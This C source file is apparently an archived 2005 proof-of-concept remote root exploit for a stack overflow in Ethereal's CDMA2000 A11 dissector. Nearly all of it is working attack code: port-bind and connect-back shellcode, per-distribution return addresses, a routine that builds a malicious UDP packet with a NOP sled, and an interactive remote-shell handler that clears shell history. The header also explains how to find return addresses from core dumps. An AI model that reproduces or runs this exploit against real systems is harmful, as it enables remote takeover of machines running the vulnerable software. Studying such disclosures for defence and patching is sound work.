/*
 * Ethereal 0.10.9 and below proof-of-concept remote root exploit
 * (c) 2005 Diego Giagio <dgiagio@irion.com.br>
 *
 * The CDMA2000 A11 protocol dissector (packet-3g-a11.c) has a stack overflow
 * vulnerability when decoding Airlink records. This vulnerability was also
 * discovered by Diego Giagio on 01/March/2005. The vendor was imediatelly
 * contacted.
 *
 *
 * Notes:
 *
 * This program has only been tested on Linux.
 *
 * If your system isn't on the target list and you are running Linux (x86), you
 * can easily find your system's ret address. See below:
 *
 * First you need to force Ethereal dump a core file.
 * bash$ ./ethereal-g3-a11 -a 0xdeadbeef -s 1 -d <your_machine_ip> -p 65535
 *
 * Then, use the script below to find the ret address from the core file:
 * --snip--
 * #!/bin/sh
 *
 * ADDR=`objdump -D -s core | \
 * grep "90909090 90909090 90909090 90909090" | \
 * head -2 | tail -1 | awk '{print 0x$1}'`
 * echo "Address: 0x$ADDR"
 * --snip--
 *
 * Use that address with the -a <address> option. Good luck.
 *
 *
 * Greets:
 *
 * ttaranto, eniac, rogbas, pjoppert, skylazart, cync, runixd,
 * surfer, setnf, cbc, SUiCiDE, _hide, Codak, dm_, nuTshell
 *
 * #buffer@ircs.ircsnet.net
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>

/*
 * portbind, execve /bin/sh linux shellcode by BreeZe <breeze@binbash.org>
 */
char sc_portbind[] =
"\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d\x08"
"\xb0\x66\xcd\x80\x89\x45\x08\x43\x89\x5d\x14\x66\xc7\x45\x16\xff\xff\x31"
"\xc0\x89\x45\x18\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10\xb0\x66\xcd\x80"
"\x40\x89\x45\x0c\x43\x43\xb0\x66\xcd\x80\x43\x89\x45\x0c\x89\x45\x10\xb0"
"\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0"
"\x3f\xcd\x80\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff"
"\x2f\x62\x69\x6e\x2f\x73\x68\x54\x52\x4f\x45\x50\x4a\x55\x48\x53";

/*
 * connectback, execve /bin/sh linux shellcode by BreeZe <breeze@binbash.org>
 * slighty modified by Diego Giagio <dgiagio@irion.com.br>
 */
char sc_connectback[] = 
"\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d\x08"
"\xb0\x66\xcd\x80\x89\x45\x08\x43\x89\x5d\x14\x43\x66\xc7\x45\x16\xff\xff"
"\xc7\x45\x18\xc6\x51\x81\x64\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10\xb0"
"\x66\xcd\x80\x8b\x5d\x08\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41"
"\xb0\x3f\xcd\x80\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89"
"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff"
"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x54\x52\x4f\x45\x50\x4a\x55\x48\x53";


typedef enum
{
    SC_NULL         = -1,
    SC_PORTBIND     =  1,
    SC_CONNECTBACK  =  2
} shellcode_type_t;

struct shellcode_t
{
    int id;

    shellcode_type_t type;

    char *desc;
    char *data;

    int host_offset;
    int port_offset;
};

struct shellcode_t shellcode_list[] =
{
    {1,  SC_PORTBIND,    "portbind",    sc_portbind,    -1, 33},
    {2,  SC_CONNECTBACK, "connectback", sc_connectback, 39, 34},
    {-1, SC_NULL, NULL, NULL, -1, -1}
};

struct target_t
{
    int   id;
    char *desc;
    long  addr;
};

struct target_t target_list[] =
{
    {1,  "Slackware 10.1      - ethereal 0.10.9 from source",   0x0812d110},
    {2,  "Slackware 10.1      - tethereal 0.10.9 from source",  0x081f30d0},
    {3,  "Fedora Core 3       - ethereal  0.10.9 from rpm",     0x08117a80},
    {4,  "Fedora Core 3       - tethereal 0.10.9 from rpm",     0x08690ac0},
    {4,  "Gentoo 2004.3       - tethereal 0.10.9 from portage", 0x081c3d90},
    {-1, NULL, -1}
};

#define PROTO_3G_A11_PORT 699

char proto_3g_a11_begin[] =
"\x01"             // a11 message type - registration request
"\x0a"             // flags
"\xff\xff"         // lifetime 0000 to ffff
"\x00\x00\x00\x00" // home address
"\xf0\x00\xba\x00" // home agent addr - any addr
"\x00\x00\x00\x00" // care of addr - any addr
"\xde\xad\xbe\xef\xd0\x00\x00\x0d" // identification
"\x26"             // ext type - CVSE_EXT
"\x00"             // nada
"\xff\xff"         // ext len
"\x00\x00\x00\x00" // vse vid
"\x01\x01"         // vse apptype 0x0101
;

char proto_3g_a11_before_shellcode[] =
"\x1a" // radius vendor specific
"\xff" // len
;

char proto_3g_a11_before_retaddrs[] =
"\x1f" // radius ad-hoc
"\xfe" // len
;

static int
find_shellcode_by_id (int id, struct shellcode_t **sc)
{
    int i;

    for (i=0; shellcode_list[i].id != -1; i++)
    {
	if (shellcode_list[i].id == id)
	{
	    *sc = &shellcode_list[i];
	    return 0;
	}
    }

    return -1;
}

static int
find_target_by_id (int id, struct target_t **target)
{
    int i;

    for (i=0; target_list[i].id != -1; i++)
    {
	if (target_list[i].id == id)
	{
	    *target = &target_list[i];
	    return 0;
	}
    }

    return -1;
}

int
parse_ip (const char *ipstr, long *ip)
{
    int a, b, c, d;

    if (sscanf (ipstr, "%d.%d.%d.%d", &a, &b, &c, &d) != 4)
	return -1;

    *ip  = (d & 0x000000ff);
    *ip |= (c & 0x000000ff) << 8;
    *ip |= (b & 0x000000ff) << 16;
    *ip |= (a & 0x000000ff) << 24;

    return 0;
}

static int
sock_create (int type, int proto)
{
    struct linger l;
    int sock;
    int sockopt;
    int ret;
    
    sock = socket (type, proto, 0);
    if (sock < 0)
	return -1;
    
    l.l_onoff  = 1;
    l.l_linger = 0;
    ret = setsockopt (sock, SOL_SOCKET, SO_LINGER, &l, sizeof (l));
    if (ret < 0)
    {
	close (sock);
	return -2;
    }
    
    sockopt = 1;
    ret = setsockopt (sock, SOL_SOCKET, SO_REUSEADDR, &sockopt,
		      sizeof (sockopt));
    if (ret < 0)
    {
	close (sock);
	return -3;
    }

    return sock;
}

static int
sock_udp_create (void)
{
    return sock_create (AF_INET, SOCK_DGRAM);
}

static int
sock_tcp_create (void)
{
    return sock_create (AF_INET, SOCK_STREAM);
}

static int
sock_connect (int sock, long host, int port)
{
    struct sockaddr_in addr;

    memset (&addr, 0, sizeof (addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons (port);
    addr.sin_addr.s_addr = htonl (host);

    if (connect (sock, (struct sockaddr *)&addr, sizeof (addr)) < 0)
	return -1;

    return sock;
}

static int
sock_bind (int sock, long host, int port)
{
    struct sockaddr_in addr;

    memset (&addr, 0, sizeof (addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons (port);
    addr.sin_addr.s_addr = htonl (host);

    if (bind (sock, (struct sockaddr *)&addr, sizeof (addr)) < 0)
	return -1;

    if (listen (sock, 1) < 0)
	return -1;
}

static int
sock_accept (int sock)
{
    fd_set fds;
    struct sockaddr_in addr;
    struct timeval tv;
    int new_sock;
    int ret;

    FD_ZERO (&fds);
    FD_SET (sock, &fds);

    tv.tv_sec  = 10;
    tv.tv_usec = 0;

    ret = select (sock + 1, &fds, NULL, NULL, &tv);
    if (ret < 0)
	return -1;

    if (ret == 0)
    {
	errno = ETIMEDOUT;
	return -1;
    }

    if (FD_ISSET (sock, &fds))
    {
	int i = sizeof (addr);

	new_sock = accept (sock, (struct sockaddr *)&addr, &i);
	if (new_sock < 0)
	    return -1;

	return new_sock;
    }

    return -1;
}

static void
sock_disconnect (int sock)
{
    close (sock);
}

static int
sock_send_payload (long dest, int port, char *packet, int packet_len)
{
    int sock;

    /* create udp socket */
    sock = sock_udp_create ();
    if (sock_connect (sock, dest, PROTO_3G_A11_PORT) < 0)
	    return -1;

    /* send packet */
    send (sock, packet, packet_len, 0);

    printf ("[-] UDP packet sent (%d bytes).\n", packet_len);
    fflush (stdout);

    /* disconnect socket */
    sock_disconnect (sock);

    return 0;
}

static void
shell (int sock)
{
    fd_set fds;
    char *cmd = "unset HISTFILE; /bin/uname -a; /usr/bin/id\n";
    char  buf [2048];
    int   n;

    printf ("[-] Enjoy your shell\n");
    printf ("\n");


    send (sock, cmd, strlen (cmd), 0);

    while (1)
    {
	FD_ZERO (&fds);
	FD_SET (sock, &fds); /* socket */
	FD_SET (0, &fds);    /* stdin */

	if (select (sock + 1, &fds, NULL, NULL, NULL) < 0)
	    break;

	if (FD_ISSET (sock, &fds))
	{
	    if ((n = recv (sock, buf, sizeof (buf), 0)) < 0)
	    {
		perror ("[-] shell(): error reading from socket: recv()");
		return;
	    }

	    if (n == 0)
		break;

	    if ((write (1, buf, n)) < 0)
	    {
		perror ("[-] shell(): error writing to stdout: write()");
		return;
	    }
	}

	if (FD_ISSET (0, &fds))
	{
	    if ((n = read (0, buf, sizeof (buf))) < 0)
	    {
		perror ("[-] shell(): error reading from stdin: read()");
		return;
	    }

	    if ((send (sock, buf, n, 0)) < 0)
	    {
		perror ("[-] shell(): error writing to socket: send()");
		return;
	    }

	    if (n == 0)
		break;
	}
    }

    printf ("[-] Connection closed.\n");
}

static void
shell_portbind (long dest, int port, char *packet, int packet_len)
{
    int sock;


    if (sock_send_payload (dest, port, packet, packet_len) < 0)
    {
	perror ("[-] Unable to send payload");
	return;
    }

    sock = sock_tcp_create ();
    if (sock < 0)
    {
	perror ("[-] Error creating socket");
	return;
    }

    printf ("[-] Delaying 3 seconds before connection attempt (portbind).");
    fflush (stdout);
    sleep (1);
    printf (".");
    fflush (stdout);
    sleep (1);
    printf (".");
    fflush (stdout);
    sleep (1);
    printf ("\n");

    if (sock_connect (sock, dest, port) < 0)
    {
	perror ("[-] Unable to connect");
	return;
    }

    shell (sock);
    sock_disconnect (sock);
}

static void
shell_connectback (long host, int port, long dest,
		   char *packet, int packet_len)
{
    int sock;
    int new_sock;

    sock = sock_tcp_create ();
    if (sock < 0)
    {
	perror ("[-] Error creating socket");
	return;
    }

    /* we bind before sending the payload to avoid not being
     * listening when the connectback shellcode tries to connect
     */
    if (sock_bind (sock, host, port) < 0)
    {
	perror ("[-] Unable to bind/listen");
	return;
    }

    if (sock_send_payload (dest, port, packet, packet_len) < 0)
    {
	perror ("[-] Unable to send payload");
	return;
    }

    printf ("[-] Waiting 10s for incoming connection (connectback)...\n");
    fflush (stdout);

    new_sock = sock_accept (sock);
    if (new_sock < 0)
    {
	perror ("[-] Unable to accept connection");
	return;
    }

    sock_disconnect (sock);

    shell (new_sock);
    sock_disconnect (new_sock);
}

static void
prog_info (void)
{
    printf ("Ethereal 0.10.9 and below proof-of-concept remote exploit.\n");
    printf ("(c) 2005 Diego Giagio <dgiagio@irion.com.br>\n");
    printf ("\n");
}

static void
usage (const char *prog)
{
    int i;

    prog_info ();

    printf ("Usage:\n");
    printf ("  [-] %s -t <target> -s <shellcode> -d <dest ip> "
	    "-h <host> -p <port>\n"
	    "  [-] %s -a <addr>   -s <shellcode> -d <dest ip> "
	    "-h <host> -p <port>\n", prog, prog);

    printf ("\n");

    printf ("Target:\n");
    for (i=0; target_list[i].id != -1; i++)
    {
	printf ("  [-] %d. %s, addr: 0x%x\n",
		target_list[i].id, target_list[i].desc, target_list[i].addr);
    }

    printf ("\n");

    printf ("Shellcode:\n");
    for (i=0; shellcode_list[i].id != -1; i++)
    {
	printf ("  [-] %d. %s\n",
		shellcode_list[i].id,
		shellcode_list[i].desc);
    }

    printf ("\n");

    printf ("Info:\n");
    printf ("  [-] 1. When using connectback shellcode, you must specify\n");
    printf ("  [-]    the host to receive the connection (-h).\n");
    printf ("\n");
    printf ("  [-] 2. When using portbind shellcode, the option (-h) will \n");
    printf ("  [-]    have no effect.\n"); 

    printf ("\n");
}

int
main (int argc, char *argv[])
{
    struct target_t    *target    = NULL;
    struct shellcode_t *shellcode = NULL;
    int    shellcode_len;

    long dest = 0;
    long host = 0;
    int  port = 0;
    long addr = 0;

    int opt;
    int opt_err = 0;
    int i;

    char *ptr_pkt;
    char  pkt[1500];
    int   pkt_len;

    while ((opt = getopt (argc, argv, "t:s:d:h:p:a:")) != EOF) 
    {
	switch (opt)
	{

	case 't': /* target id */
	    if (find_target_by_id (atoi (optarg), &target) < 0)
	    {
		printf ("Not a valid target id.\n");
		opt_err ++;
	    }
	    break;

	case 's': /* shellcode id */
	    if (find_shellcode_by_id (atoi (optarg), &shellcode) < 0)
	    {
		printf ("Not a valid shellcode id.\n");
		opt_err ++;
	    }
	    break;

	case 'd': /* destination */
	    if (parse_ip (optarg, &dest) < 0)
	    {
		printf ("Invalid address for destination.\n");
		opt_err ++;
	    }
	    break;

	case 'h': /* host for connectback */
	    if (parse_ip (optarg, &host) < 0)
	    {
		printf ("Invalid address for host.\n");
		opt_err ++;
	    }

	    break;

	case 'p': /* port for connectback or portbind */
	    port = atoi (optarg);
	    if (port < 0 || port > 65535)
	    {
		printf ("Invalid port.\n");
		opt_err ++;
	    }

	    break;

	case 'a': /* ret address */
	    if (sscanf (optarg, "0x%x", &addr) != 1)
	    {
		printf ("Invalid address.\n");
		opt_err ++;
	    }
	    break;

	case '?':
	default:
		usage (argv[0]);
		opt_err ++;
		break;
	}
    }

    if (opt_err != 0)
	return -1;

    if (argc < 2)
    {
	    usage (argv[0]);
	    return 0;
    }

    if (target == NULL && addr == 0)
    {
	printf ("Please choose either a target (-t) or an address (-a).\n");
	return -1;
    }

    if (target != NULL && addr != 0)
    {
	printf ("Target (-t) and address (-a) cannot be used together.\n");
	return -1;
    }

    addr = target != NULL ? target->addr : addr;

    if (shellcode == NULL)
    {
	printf ("Please choose a shellcode (-s).\n");
	return -1;
    }

    shellcode_len = strlen (shellcode->data);

    if (dest == 0)
    {
	printf ("Please choose a destination (-d).\n");
	return -1;
    }

    if (shellcode->host_offset != -1)
    {
	char *ptr;

	if (host == 0)
	{
	    printf ("Please choose a host (-h).\n");
	    return -1;
	}

	ptr      = shellcode->data + shellcode->host_offset;
	*(ptr++) = (host & 0xff000000) >> 24;
	*(ptr++) = (host & 0x00ff0000) >> 16;
	*(ptr++) = (host & 0x0000ff00) >> 8;
	*(ptr++) = (host & 0x000000ff);
    }

    if (shellcode->port_offset != -1)
    {
	char *ptr;

	if (port == 0)
	{
	    printf ("Please choose a port (-p).\n");
	    return -1;
	}

	ptr      = shellcode->data + shellcode->port_offset;
	*(ptr++) = (port & 0xff00) >> 8;
	*(ptr++) = (port & 0x00ff);
    }


    /* copyright */
    prog_info ();

    /* some info */
    printf ("[-] Using addr 0x%x\n", addr);
    fflush (stdout);

    /* build packet */
    ptr_pkt = pkt;

    memcpy (ptr_pkt, proto_3g_a11_begin,
	    sizeof (proto_3g_a11_begin));
    ptr_pkt += sizeof (proto_3g_a11_begin) - 1;

    memcpy (ptr_pkt, proto_3g_a11_before_shellcode,
	    sizeof (proto_3g_a11_before_shellcode));
    ptr_pkt += sizeof (proto_3g_a11_before_shellcode) - 1;

    /* shellcode */
    memset (ptr_pkt, 0x90, 255);
    ptr_pkt += 255 - shellcode_len - 2;
    memcpy (ptr_pkt, shellcode->data, shellcode_len);
    ptr_pkt += shellcode_len;

    memcpy (ptr_pkt, proto_3g_a11_before_retaddrs,
	    sizeof (proto_3g_a11_before_retaddrs));
    ptr_pkt += sizeof (proto_3g_a11_before_retaddrs) - 1;
    
    /* addrs */
    for (i=0; i<254; i+=4)
    {
	ptr_pkt[i]   = (addr & 0x000000ff);
	ptr_pkt[i+1] = (addr & 0x0000ff00) >> 8;
	ptr_pkt[i+2] = (addr & 0x00ff0000) >> 16;
	ptr_pkt[i+3] = (addr & 0xff000000) >> 24;
    }
    ptr_pkt += 254;

    /* calc packet len */
    pkt_len = ptr_pkt - pkt;


    switch (shellcode->type)
    {
    case SC_PORTBIND:
	shell_portbind (dest, port, pkt, pkt_len);
	break;
    case SC_CONNECTBACK:
	shell_connectback (host, port, dest, pkt, pkt_len);
	break;
    default:
	/* NOT REACHED */
	break;
    }

    return 0;
}



// milw0rm.com [2005-03-14]
